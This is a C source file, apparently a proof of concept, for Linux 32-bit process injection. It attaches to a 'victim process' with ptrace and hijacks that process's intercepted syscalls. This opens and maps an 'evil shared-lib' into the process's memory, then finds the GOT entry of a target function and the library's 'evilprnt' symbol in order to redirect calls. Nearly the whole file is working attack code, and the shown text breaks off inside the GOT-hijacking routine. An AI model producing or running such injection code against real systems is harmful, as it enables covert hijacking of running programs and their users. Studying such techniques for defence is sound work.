#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <assert.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <elf.h>

#define always_inline __attribute((always_inline));

#define power(x, y)                   \
({                                    \
    int _ret = x;                     \
    for (int i = 0; i < (y - 1); ++i) \
        _ret *= x;                    \
    _ret;                             \
})

#define FUNC_SUCCESS 0x1
#define FUNC_FAILURE !FUNC_SUCCESS

#define __error(prnt_func, msg) \
{                               \
    prnt_func(msg);             \
    return FUNC_FAILURE;        \
}

#define __strlen(addr)         \
({                             \
    size_t len = 0;            \
    char *sptr = (char *)addr; \
    while (sptr[len] != 0)     \
        ++len;                 \
    len;                       \
})

#define STR_EQUAL     0x1
#define STR_NOT_EQUAL !STR_EQUAL
#define __str_is_equal(str1, str2, sz)    \
({                                        \
    int __ret = STR_NOT_EQUAL;            \
    if (strncmp(str1, str2, sz) == 0)     \
        __ret = STR_EQUAL;                \
    __ret;                                \
})

#define GET_MULTIPLE_OF_LONG_BUF_SIZE(x) \
    ((x) % sizeof(long) ? ((x) - ((x) % sizeof(long))) + sizeof(long) : x )


struct victim_proc_struct 
{
    char *victim_symbol_name;
    pid_t pid;
	struct user_regs_struct regs;
    struct 
    {
        char *base_address;
        Elf32_Addr victim_got_entry_address;
        Elf32_Addr victim_got_entry_orig_content;
        struct {
            Elf32_Addr base_address;
            Elf32_Xword memsz;
        } text_segment, data_segment, dyn_segment;
    } mem;
    struct 
    {
        int fd;
        char *mmap_address;
        char *path;
        Elf32_Addr entrypoint;
        struct 
        {
            Elf32_Addr base_address;
            Elf32_Off fileoffset;
            Elf32_Xword filesz;
            Elf32_Xword memsz;
        } text_segment0,text_segment1, data_segment0, data_segment1; //一般是有4个loadable段,但是有些只有2个loadable段
	//size_t size;
    } evil_lib;
} victim_process;

int process_attach(void)
{
   printf("attaching to victim process...\t");

   if (ptrace(PTRACE_ATTACH, victim_process.pid, 0, 0) < 0)
       __error(perror, "error @ line [98]");
   waitpid(victim_process.pid, 0, 0);

   ptrace(PTRACE_SETOPTIONS, victim_process.pid, 0, PTRACE_O_TRACESYSGOOD);

   printf("[done]\n");

   return FUNC_SUCCESS;
}

int process_detach(void)
{
    printf("detaching from victim process...\t");
    
    if (ptrace(PTRACE_DETACH, victim_process.pid, 0, 0)  < 0)
        __error(perror, "error @ line [111]");

    printf("[done]\n");

    return FUNC_SUCCESS;
}

int locate_victim_got_entry()
{
    printf("searching for victim got entry...\t");

    struct user_regs_struct regs;
    for ( ; ; ) 
    {
        if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0x0, 0x0) < 0)
            __error(perror, "error @ line [126]");
        waitpid(victim_process.pid, 0, 0);

        if ((ptrace(PTRACE_GETREGS, victim_process.pid, 0, &regs) < 0))
            __error(perror, "error @ line [130]");

        /*
         * [+] should check for other system calls that will have a pointer to address
         *     in the data segment as one of it's arguments for this Poc, I check for 
         *     write syscall only
         * [+] the argument could be a stack address so we must filter against this
         *     (considering the stack and heap locations in the process layout it's 
         *      easier to substract from the base of the heap to get the address from
         *      which the searching for the start of the elf begins)
         * [+] 拦截write系统调用
        */
        if (regs.orig_eax == SYS_write) 
        {
            /*
             * pointer to data in the stack ?
             */
            if (((regs.esp >> 24) & 0xff) != 0xbf)
                continue;
            //char* saddr = (char *)((regs.rsi & (~0xfff)) - 0x2000000);
            char* saddr = (char *)(0x8048000);
            for (unsigned long data = 0; (data & 0xff) != '\x7f';) 
            {
                data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, saddr++, 0x0);
            }
            //0x804800
            victim_process.mem.base_address = --saddr;

            //exit write syscall.
            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0x0, 0x0) < 0)
                __error(perror, "error @ line [155]");
            waitpid(victim_process.pid, 0x0, 0x0);
            if ((ptrace(PTRACE_GETREGS, victim_process.pid, 0, &regs) < 0))
                __error(perror, "error @ line [130]");
            break;
        }
    } //end of 'for' loop

    //ELF Header(0x80480000)
    long *dummy_ptr = (long *)victim_process.mem.base_address;
    long ehdr[GET_MULTIPLE_OF_LONG_BUF_SIZE(sizeof(Elf32_Ehdr))];
    Elf32_Ehdr *ehdr_ptr = (Elf32_Ehdr *)ehdr;
    for (uint32_t x = 0; x < (sizeof(ehdr) / sizeof(long)); x++) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, dummy_ptr++, 0x0);
        ehdr[x] = data;
    }
    //Program Header Table
    dummy_ptr = (long *)(victim_process.mem.base_address + ehdr_ptr->e_phoff);
    long phdr_size = GET_MULTIPLE_OF_LONG_BUF_SIZE(sizeof(Elf32_Phdr) * ehdr_ptr->e_phnum);
    long phdr[phdr_size];
    Elf32_Phdr *phdr_ptr = (Elf32_Phdr *)phdr;
    for (unsigned int x = 0; x < (sizeof(phdr) / sizeof(long)); x++) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, dummy_ptr++, 0x0);
        phdr[x] = data;
    }

    Elf32_Phdr *tmp_phdr_ptr = phdr_ptr;
    for (unsigned int x = 0; x < ehdr_ptr->e_phnum; x++) 
    {
        switch (tmp_phdr_ptr->p_type) 
        {
            case PT_LOAD:
                if (tmp_phdr_ptr->p_flags & PF_X) 
                {
                    victim_process.mem.text_segment.base_address =
                        tmp_phdr_ptr->p_vaddr ?
                        tmp_phdr_ptr->p_vaddr :
                        (Elf32_Addr)victim_process.mem.base_address;
                    victim_process.mem.text_segment.memsz = tmp_phdr_ptr->p_memsz;
                }
                else 
                {
                    victim_process.mem.data_segment.base_address =
                        tmp_phdr_ptr->p_vaddr > (Elf32_Addr)victim_process.mem.base_address ?
                        tmp_phdr_ptr->p_vaddr :
                        (Elf32_Addr)(victim_process.mem.base_address + tmp_phdr_ptr->p_vaddr);
                    victim_process.mem.data_segment.memsz = tmp_phdr_ptr->p_memsz;
                }
                break;
            case PT_DYNAMIC:
                //should be 0x804bf14
                victim_process.mem.dyn_segment.base_address =
                    tmp_phdr_ptr->p_vaddr > (Elf32_Addr)victim_process.mem.base_address ?
                    tmp_phdr_ptr->p_vaddr :
                    (Elf32_Addr)(victim_process.mem.base_address + tmp_phdr_ptr->p_vaddr);
                //should be 0xe8
                victim_process.mem.dyn_segment.memsz = tmp_phdr_ptr->p_memsz;
                break;
        }
        tmp_phdr_ptr++;
    }
    //Dynamic Segment
    dummy_ptr = (long *)victim_process.mem.dyn_segment.base_address;
    long dyn_table_size = GET_MULTIPLE_OF_LONG_BUF_SIZE(victim_process.mem.dyn_segment.memsz);
    long dyn_table[dyn_table_size];
    Elf32_Dyn *dyn_ptr = (Elf32_Dyn *)dyn_table;
    for (unsigned int x = 0; x < (sizeof(dyn_table) / sizeof(long)); x++) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, dummy_ptr++, 0x0);
        dyn_table[x] = data;
    }

    Elf32_Rel *pltrel_table_address;
    Elf32_Sword pltrel_table_size;
    Elf32_Sym *sym_table_address;
    char *str_table_address;
    long str_table_size;
    for ( ; dyn_ptr->d_tag != DT_NULL; dyn_ptr++) 
    {
        switch (dyn_ptr->d_tag) 
        {
            case DT_JMPREL:
                pltrel_table_address = (Elf32_Rel *)dyn_ptr->d_un.d_ptr;
                break;
            case DT_PLTRELSZ:
                pltrel_table_size = (Elf32_Sword)dyn_ptr->d_un.d_val;
                break;
            case DT_SYMTAB:
                sym_table_address = (Elf32_Sym *)dyn_ptr->d_un.d_ptr;
                break;
            case DT_STRTAB:
                str_table_address = (char *)dyn_ptr->d_un.d_ptr;
                break;
            case DT_STRSZ:
                str_table_size = GET_MULTIPLE_OF_LONG_BUF_SIZE(dyn_ptr->d_un.d_val);
                break;
        }
    }

    //dynstrtab
    long str_table[str_table_size];
    dummy_ptr = (long *)str_table_address;
    char *str_table_ptr = (char *)str_table;
    for (unsigned int x = 0; x < (sizeof(str_table) / sizeof(long)); x++) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, dummy_ptr++, 0x0);
        str_table[x] = data;
    }
    dummy_ptr = (long *)pltrel_table_address;
    long pltrel_size = GET_MULTIPLE_OF_LONG_BUF_SIZE(pltrel_table_size);
    long pltrel_table[pltrel_size];
    Elf32_Rel *pltrel_ptr = (Elf32_Rel *)pltrel_table;
    for (unsigned long x = 0; x < (sizeof(pltrel_table) / sizeof(long)); x++) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, dummy_ptr++, 0x0);
        pltrel_table[x] = data;
    }

#define VICTIM_SYMBOL_FOUND     0x1
#define VICTIM_SYMBOL_NOT_FOUND !VICTIM_SYMBOL_FOUND
    long found_victim_symbol = VICTIM_SYMBOL_NOT_FOUND;
    for (unsigned long x = 0; x < (pltrel_table_size / sizeof(Elf32_Rel)); x++) 
    {
        Elf32_Sym *sym = &sym_table_address[ELF32_R_SYM(pltrel_ptr->r_info)];        
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, sym, 0x0);
        long sym_strtab_indx = (data & 0xffffffff);

        //such as 'printf'
        if (__str_is_equal(victim_process.victim_symbol_name,
                           &str_table_ptr[sym_strtab_indx],
                           strlen(victim_process.victim_symbol_name))) 
        {
            //r_offset: 
            //  This member gives the location at which to apply the relocation action.
            //  For a relocatable file, the value is the byte offset from the beginning 
            //  of the section to the storage unit affected by the relocation. For an 
            //  executable file or shared object, the value is the virtual address of  
            //  the storage unit affected by the relocation.
            found_victim_symbol = VICTIM_SYMBOL_FOUND;
            //should be 0x804c00c
            victim_process.mem.victim_got_entry_address =
                pltrel_ptr->r_offset > (Elf32_Off)victim_process.mem.base_address ?
                pltrel_ptr->r_offset :
                (Elf32_Addr)(victim_process.mem.base_address + pltrel_ptr->r_offset);
        }
        pltrel_ptr++;
    }
    if (!found_victim_symbol)
        __error(printf, "symbol not found in target process\n");

    printf("[done]\n");
    
    return FUNC_SUCCESS;
}


/*
 * get the segment informations from our evil shared lib
 */
long evil_lib_get_info(void)
{
    printf("getting segment informations for the evil shared-lib...\t");

    int fd;
    struct stat stat;
    char *mmap_address;
    Elf32_Ehdr *ehdr;
    Elf32_Phdr *phdr;

    if ((fd = open(victim_process.evil_lib.path, O_RDWR)) < 0)
        __error(perror, "error @ line [335]");

    if (fstat(fd, &stat) < 0)
        __error(perror, "error @ line [338]");

    //映射整个elf文件
    mmap_address = (char *)mmap(NULL, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmap_address == MAP_FAILED)
        __error(perror, "error @ line [340]");


    /*
     * no elf sanity checks are made
     */
    ehdr = (Elf32_Ehdr *)mmap_address;
    ehdr->e_type = ET_EXEC;
    phdr = (Elf32_Phdr *)(mmap_address + ehdr->e_phoff);

    for (unsigned int i = 0; i < ehdr->e_phnum; phdr++, i++) 
    {
        if (phdr->p_type == PT_LOAD) 
        {
            if (phdr->p_flags & PF_X) 
            {
                victim_process.evil_lib.text_segment1.base_address = phdr->p_vaddr; //0x1000
                victim_process.evil_lib.text_segment1.filesz = phdr->p_filesz;      //0x52
                victim_process.evil_lib.text_segment1.fileoffset = phdr->p_offset;  //0x1000
                victim_process.evil_lib.text_segment1.memsz = phdr->p_memsz;        //0x52
            }
            else if (phdr->p_flags & PF_W) 
            {
                victim_process.evil_lib.data_segment1.base_address = phdr->p_vaddr; //0x3fa0
                victim_process.evil_lib.data_segment1.filesz = phdr->p_filesz;      //0x6c
                victim_process.evil_lib.data_segment1.fileoffset = phdr->p_offset;  //0x2fa0
                victim_process.evil_lib.data_segment1.memsz = phdr->p_memsz;        //0x6c
            }
            else if (phdr->p_offset == 0)
            {
            
                victim_process.evil_lib.text_segment0.base_address = phdr->p_vaddr; //0x0
                victim_process.evil_lib.text_segment0.filesz = phdr->p_filesz;      //0x172
                victim_process.evil_lib.text_segment0.fileoffset = phdr->p_offset;  //0x0 
                victim_process.evil_lib.text_segment0.memsz = phdr->p_memsz;        //0x172
            }
            else 
            {
                
                victim_process.evil_lib.data_segment0.base_address = phdr->p_vaddr; //0x2000
                victim_process.evil_lib.data_segment0.filesz = phdr->p_filesz;      //0x50
                victim_process.evil_lib.data_segment0.fileoffset = phdr->p_offset;  //0x2000
                victim_process.evil_lib.data_segment0.memsz = phdr->p_memsz;        //0x50
            }
        }
    }

    //
    close(fd);

    printf("[done]\n");

    return FUNC_SUCCESS;
}

int inject_evil_sharedlib(void)
{
    printf("injecting the evil shared-lib into the victim process...\t");

    long victim_process_orig_data[GET_MULTIPLE_OF_LONG_BUF_SIZE(1024)];

    struct user_regs_struct tmp_user_regs;

#define FLAG_OPEN_EVIL_LIB_EXEC  1
#define FLAG_MMAP_EVIL_LIB_TEXT0 2
#define FLAG_MMAP_EVIL_LIB_TEXT1 4
#define FLAG_MMAP_EVIL_LIB_DATA0 8
#define FLAG_MMAP_EVIL_LIB_DATA1 16
    unsigned long flag = FLAG_OPEN_EVIL_LIB_EXEC;
    
    /*
     * fake open(), mmap2()执行
     */ 
#define NUM_OF_INTERCEPTED_SYSCALLS 5
    for (unsigned long x = 0; x != NUM_OF_INTERCEPTED_SYSCALLS; ++x) 
    {
        if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
             __error(perror, "error @ line [388]");
        waitpid(victim_process.pid, 0, 0);

        if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &victim_process.regs) < 0)
            __error(perror, "error @ line [392]");
        tmp_user_regs = victim_process.regs;

        /*
         * exceute SYS_open
         */
        if (flag == FLAG_OPEN_EVIL_LIB_EXEC) 
        {
            size_t len = __strlen(victim_process.evil_lib.path);

            //we want a sizeof(long) aligned data segment writes
            size_t aligned_size = 
                len % sizeof(long) ? (len + (sizeof(long) - len % sizeof(long))): len;

            //insert our evil lib path into the victim's data segment
#define NUM_OF_BITS_IN_BYTE 8
            long *path = (long *)victim_process.evil_lib.path;
            long* victim_process_data_address_ptr = (long *)(victim_process.mem.data_segment.base_address
                    + victim_process.mem.data_segment.memsz);
            for (unsigned int x = 0; x != (aligned_size / sizeof(long)); ++x) 
            {
                /*
                 * we are copying last word and the lib path len is not sizeof(long) alinged
                 * then ensure that the padding bytes are zeros
                 */
                long tmp = *path++;
                if (( x == (aligned_size/sizeof(long) - 1)) && (len % sizeof(long)))
                    tmp &= (0xffffffff >> ((aligned_size - len) * NUM_OF_BITS_IN_BYTE));
                if (ptrace(PTRACE_POKETEXT, victim_process.pid, victim_process_data_address_ptr++, tmp) < 0)
                    __error(perror, "error @ line [420]"); 
            }
            
            //open()
            tmp_user_regs.ebx = victim_process.mem.data_segment.base_address
                + victim_process.mem.data_segment.memsz;
            tmp_user_regs.ecx = O_RDWR;
            tmp_user_regs.edx = S_IRWXU;
            tmp_user_regs.orig_eax = SYS_open;

            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [430]");

            //exit open syscall.
            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [433]");
            waitpid(victim_process.pid, 0, 0);

            if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [437]");

            //tmp_user_regs.eax = fd(should be 3 normally)
            if (tmp_user_regs.eax < 0)
                __error(perror, "error @ line [452]");
            victim_process.evil_lib.fd = tmp_user_regs.eax;

            /*
             * execute the intercepted syscall(int $0x80反汇编为cd 80)
             */
            tmp_user_regs.eip = victim_process.regs.eip - 2; //
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [460]");
            //enter syscall.
            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [463]");
            waitpid(victim_process.pid, 0, 0);

            tmp_user_regs = victim_process.regs;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [468]");
            //leave syscall.
            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [471]");
            waitpid(victim_process.pid, 0, 0);

            flag = FLAG_MMAP_EVIL_LIB_TEXT0;
        }
        /*
         * execute SYS_mmap2
         * [1] mmap the text segment of the our shared lib
        */
        else if (flag == FLAG_MMAP_EVIL_LIB_TEXT0) 
        {
            tmp_user_regs.ebx = 0xb0000000; //should be carefull to choose
            tmp_user_regs.ecx = victim_process.evil_lib.text_segment0.filesz; //
            tmp_user_regs.edx = PROT_READ;
            tmp_user_regs.esi = MAP_PRIVATE | MAP_FIXED | MAP_EXECUTABLE;
            tmp_user_regs.edi  = victim_process.evil_lib.fd;
            tmp_user_regs.ebp  = 0; 
            tmp_user_regs.orig_eax = SYS_mmap2;

            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [480]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [483]");
            waitpid(victim_process.pid, 0, 0);

            if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [487]");

            if ((long)tmp_user_regs.eax == -1)
                __error(perror, "error @ line [487]");

            victim_process.evil_lib.mmap_address = (char *)tmp_user_regs.eax; //0xb0000000 
            
            /*
             * execute the intercepted syscall
            */
            tmp_user_regs.eip = victim_process.regs.eip - 2;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [499]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [502]");
            waitpid(victim_process.pid, 0, 0);

            tmp_user_regs = victim_process.regs;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [507]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [510]");
            waitpid(victim_process.pid, 0, 0);

            //flag = FLAG_MMAP_EVIL_LIB_DATA;
            flag = FLAG_MMAP_EVIL_LIB_TEXT1;
        }
        else if (flag == FLAG_MMAP_EVIL_LIB_TEXT1)
        {
                    
            tmp_user_regs.ebx = (long)victim_process.evil_lib.mmap_address
                                    + victim_process.evil_lib.text_segment1.base_address;
            tmp_user_regs.ecx = victim_process.evil_lib.text_segment1.memsz; //
            tmp_user_regs.edx = PROT_READ | PROT_EXEC;
            tmp_user_regs.esi = MAP_PRIVATE | MAP_FIXED | MAP_EXECUTABLE;
            tmp_user_regs.edi  = victim_process.evil_lib.fd;
            tmp_user_regs.ebp  = (victim_process.evil_lib.text_segment1.fileoffset / 4096); 
            tmp_user_regs.orig_eax = SYS_mmap2;

            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [480]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [483]");
            waitpid(victim_process.pid, 0, 0);

            if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [487]");

            if ((long)tmp_user_regs.eax == -1) //0xb0001000
                __error(perror, "error @ line [487]");

            /*
             * execute the intercepted syscall
            */
            tmp_user_regs.eip = victim_process.regs.eip - 2;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [499]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [502]");
            waitpid(victim_process.pid, 0, 0);

            tmp_user_regs = victim_process.regs;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [507]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [510]");
            waitpid(victim_process.pid, 0, 0);

            flag = FLAG_MMAP_EVIL_LIB_DATA0;
        }
        else if (flag == FLAG_MMAP_EVIL_LIB_DATA0)
        {
                    
            tmp_user_regs.ebx = (long)victim_process.evil_lib.mmap_address
                                    + victim_process.evil_lib.data_segment0.base_address;
            tmp_user_regs.ecx = victim_process.evil_lib.data_segment0.memsz; //
            tmp_user_regs.edx = PROT_READ;
            tmp_user_regs.esi = MAP_PRIVATE | MAP_FIXED;
            tmp_user_regs.edi  = victim_process.evil_lib.fd;
            tmp_user_regs.ebp  = (victim_process.evil_lib.data_segment0.fileoffset / 4096); 
            tmp_user_regs.orig_eax = SYS_mmap2;

            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [480]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [483]");
            waitpid(victim_process.pid, 0, 0);

            if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [487]");

            if ((long)tmp_user_regs.eax == -1) //0xb0002000
                __error(perror, "error @ line [487]");

            /*
             * execute the intercepted syscall
            */
            tmp_user_regs.eip = victim_process.regs.eip - 2;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [499]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [502]");
            waitpid(victim_process.pid, 0, 0);

            tmp_user_regs = victim_process.regs;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [507]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [510]");
            waitpid(victim_process.pid, 0, 0);

            flag = FLAG_MMAP_EVIL_LIB_DATA1;
        }
        /*
         * [2] mmap2 the data segment of our shared lib 
        */
         else if (flag == FLAG_MMAP_EVIL_LIB_DATA1) 
         {
             long rem = (victim_process.evil_lib.data_segment1.base_address % 0x1000);
             long align = victim_process.evil_lib.data_segment1.base_address - rem;
             tmp_user_regs.ebx = (long)victim_process.evil_lib.mmap_address + align;
            tmp_user_regs.ecx = victim_process.evil_lib.data_segment1.memsz + rem;
            tmp_user_regs.edx = PROT_READ | PROT_WRITE;
            tmp_user_regs.esi = MAP_PRIVATE | MAP_FIXED;
            tmp_user_regs.edi  = victim_process.evil_lib.fd;
            tmp_user_regs.ebp  = ((victim_process.evil_lib.data_segment1.fileoffset - rem) / 4096);
            tmp_user_regs.orig_eax = SYS_mmap2;

            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [532]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [535]");
            waitpid(victim_process.pid, 0, 0);

            if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [539]");

            if ((long)tmp_user_regs.eax == -1) //0xb0003000
                __error(perror, "error @ line [542]");
            
            /*
             * execute the intercepted syscall(may be write or sleep)
             */
            tmp_user_regs.eip = victim_process.regs.eip - 2;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [549]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [552]");
            waitpid(victim_process.pid, 0, 0);

            tmp_user_regs = victim_process.regs;
            if (ptrace(PTRACE_SETREGS, victim_process.pid, 0, &tmp_user_regs) < 0)
                __error(perror, "error @ line [557]");

            if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
                __error(perror, "error @ line [560]");
            waitpid(victim_process.pid, 0, 0);
         }
    }

    printf("[done]\n");

    printf("hijacking the target got entry in the victim process...\t");

    //if (ptrace(PTRACE_SYSCALL, victim_process.pid, 0, 0) < 0)
    //     __error(perror, "error @ line [388]");
    //waitpid(victim_process.pid, 0, 0);

    //if (ptrace(PTRACE_GETREGS, victim_process.pid, 0, &victim_process.regs) < 0)
    //    __error(perror, "error @ line [392]");
    //tmp_user_regs = victim_process.regs;

    /*
     * [+] get the evilprnt() address in our mmap() shared lib
     * [+] search for the offset to apply the patch
     * [+] those addresses belongs to the remote process so there must
     *     be ptrace()'s PEEKTEXT to parse the data
    */
    long *evillib_start_address = (long *)victim_process.evil_lib.mmap_address; //0xb0000000
    
    //sizeof Elf32_Ehdr is assumed to be multiple the sizeof long
    long evillib_ehdr_bytes = GET_MULTIPLE_OF_LONG_BUF_SIZE(sizeof(Elf32_Ehdr)); //0x34
    long evillib_ehdr_sz = evillib_ehdr_bytes / sizeof(long);
    long evillib_ehdr_buf[evillib_ehdr_sz];
    for (long x = 0; x < evillib_ehdr_sz; x++) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, evillib_start_address++, 0x0);
        if (data == -1)
            __error(perror, "error @ line [749]")
        evillib_ehdr_buf[x] = data;
    }
    //Program header table
    long *evillib_phdr_address = (long *)(victim_process.evil_lib.mmap_address + ((Elf32_Ehdr *)evillib_ehdr_buf)->e_phoff);
    long evillib_phdr_bytes = ((Elf32_Ehdr *)evillib_ehdr_buf)->e_phnum * sizeof(Elf32_Phdr);
    long evillib_phdr_sz = evillib_phdr_bytes / sizeof(long);
    long evillib_phdr_buf[evillib_phdr_sz];
    for (long x = 0; x < evillib_phdr_sz; x++) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, evillib_phdr_address++, 0x0);
        if (data == -1)
            __error(perror, "error @ line [761]")
        evillib_phdr_buf[x] = data;
    }

    Elf32_Ehdr *evil_tmp_ehdr = (Elf32_Ehdr *)evillib_ehdr_buf;
    Elf32_Phdr *evil_tmp_phdr = (Elf32_Phdr *)evillib_phdr_buf;
    long *evillib_dyn_address;
    long evillib_dyn_bytes;
    for (Elf32_Half x = 0; x < evil_tmp_ehdr->e_phnum; x++) 
    {
        if (evil_tmp_phdr[x].p_type == PT_DYNAMIC) 
        {
            evillib_dyn_address =
                (long *)(victim_process.evil_lib.mmap_address + 
                         evil_tmp_phdr[x].p_vaddr); //0xb0003fa0 
            evillib_dyn_bytes = GET_MULTIPLE_OF_LONG_BUF_SIZE(evil_tmp_phdr[x].p_memsz); //0x60
            break;
        }
    }

    //long evillib_dyn_sz = evillib_dyn_bytes / sizeof(long);
    //long evillib_dyn_buf[evillib_dyn_sz];
    //for (long x = 0; x < evillib_dyn_sz; x++)
    //{
    //    long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, evillib_dyn_address++, 0x0);
    //    //if (data == -1)
    //    //    __error(perror, "error @ line [783]")
    //    evillib_dyn_buf[x] = data;
    //}
    Elf32_Dyn *tmp_dyn_ptr = (Elf32_Dyn *)evillib_dyn_address;
    long *evillib_symtab_address;
    long *evillib_strtab_address;
    long evillib_strtab_sz;
    for (long x = 0; x == 0; ) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, tmp_dyn_ptr, 0x0);
        if (data == -1)
            __error(perror, "error @ line [794]")
        
        switch (data) 
        {
            case DT_SYMTAB:
                evillib_dyn_address = (long *)tmp_dyn_ptr;
                long evillib_symtab_offset = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                                    ++evillib_dyn_address,
                                                    0x0);
                
                evillib_symtab_address = 
                    (long *)(victim_process.evil_lib.mmap_address +
                            evillib_symtab_offset);
                break;
            case DT_STRTAB:
                evillib_strtab_address = (long *)tmp_dyn_ptr;
                long evillib_strtab_offset = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                                    ++evillib_strtab_address,
                                                    0x0);
                evillib_strtab_address = 
                    (long *)(victim_process.evil_lib.mmap_address +
                             evillib_strtab_offset);
                break;
            case DT_STRSZ:
                evillib_dyn_address = (long *)tmp_dyn_ptr;
                evillib_strtab_sz = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                           ++evillib_dyn_address,
                                           0x0);
               break;
            case DT_NULL:
                x++;
        }
        tmp_dyn_ptr++;
    }

    long evillib_strtab_buf[GET_MULTIPLE_OF_LONG_BUF_SIZE(evillib_strtab_sz)];
    long *tmp_strtab_ptr = evillib_strtab_address;
    for (uint32_t x = 0; x < (sizeof(evillib_strtab_buf) / sizeof(long)); x++) 
    {
        long data = ptrace(PTRACE_PEEKTEXT, victim_process.pid, tmp_strtab_ptr++, 0x0);
        evillib_strtab_buf[x] = data;
    }
    char* strtab = (char *)evillib_strtab_buf;
    //    
    Elf32_Sym *tmp_symtab_ptr = (Elf32_Sym *)evillib_symtab_address;
    while (1) 
    {
#define EVILLIB_ENTRYPOINT_SYMBOL_NAME "evilprnt"
        //st_name
        long syment_name = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                        evillib_symtab_address, 
                                        0x0);
        long syment_strtab_indx = syment_name & (0xffffffff);
        //st_value
        long syment_value = ptrace(PTRACE_PEEKTEXT, victim_process.pid,
                                   ++evillib_symtab_address, 
                                   0x0);
        //search for evilprnt
        char *sym_name = (char *)evillib_strtab_buf + syment_strtab_indx;
        if (__str_is_equal(EVILLIB_ENTRYPOINT_SYMBOL_NAME,
                           sym_name, strlen(EVILLIB_ENTRYPOINT_SYMBOL_NAME))) 
        {
            victim_process.evil_lib.entrypoint = (Elf32_Addr)(victim_process.evil_lib.mmap_address + syment_value);
            /* 
             * this block will surely get excuted so it's fine to set the only break 
             * for the while loop inside this if block breaking the loop here could be 
